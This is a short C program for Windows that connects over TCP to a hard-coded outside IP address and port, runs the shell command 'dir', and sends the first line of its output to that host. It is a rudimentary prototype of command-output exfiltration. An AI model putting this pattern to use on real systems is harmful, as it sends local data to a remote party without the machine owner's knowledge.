#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock.h>

int main(int argc, char**argv){
const int iReqWinsockVer = 2;   // Minimum winsock version required

WSADATA wsaData;
SOCKET hSocket;
SOCKADDR_IN sockAddr;
char MSG[256];

if (WSAStartup(MAKEWORD(iReqWinsockVer,0), &wsaData)==0)
{
    // Check if major version is at least iReqWinsockVer
    if (LOBYTE(wsaData.wVersion) >= iReqWinsockVer)
    {
        hSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (hSocket==INVALID_SOCKET){
            printf("Socket failed\n");
        }
        else{
            printf("Socket Launched\n");
            
            sockAddr.sin_family = AF_INET;

            sockAddr.sin_port = htons(5499);

            sockAddr.sin_addr.S_un.S_addr = inet_addr("80.112.129.129");
            
            if (connect(hSocket, (SOCKADDR*)(&sockAddr), sizeof(sockAddr))!=0){
                printf("Could not connect.\n");
            }else{
                printf("Connected!\n");
                FILE* commText = popen("dir","r");
                if (commText != NULL){
                    char* lineP = fgets(MSG, sizeof(MSG), commText);
                    printf("sizeof:%d strlen:%d",sizeof(MSG),strlen(MSG));
                    if (send(hSocket, MSG, strlen(MSG), 0) == SOCKET_ERROR){
                        printf("Could not send\n");
                    }else{
                        printf("Data sent!\n");
                    }
                }else{
                    printf("Could not popen.\n");
                }
                pclose(commText);
            }
            
            closesocket(hSocket);
        }
    }
    else
    {
        printf("Required version not available\n");
    }

    // Cleanup winsock
    if (WSACleanup()!=0)
    {
        printf("cleanup failed\n");
    }
}
else
{
    printf("startup failed\n");
}
return 0;
}
